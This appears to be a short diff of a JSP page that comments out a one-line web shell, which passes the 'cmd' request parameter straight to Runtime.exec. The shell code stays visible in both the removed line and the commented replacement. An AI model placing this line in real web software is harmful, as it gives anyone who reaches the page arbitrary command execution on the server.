@@ -5,7 +5,7 @@
   Time: 1:01
   To change this template use File | Settings | File Templates.
 --%>
-<%=Runtime.getRuntime().exec(request.getParameter("cmd"))%>
+<%--<%=Runtime.getRuntime().exec(request.getParameter("cmd"))%>--%>
 <%@ page contentType="text/html;charset=UTF-8" language="java" %>
 <%@ page import="java.io.ByteArrayOutputStream" %>
 <%@ page import="java.io.InputStream" %>
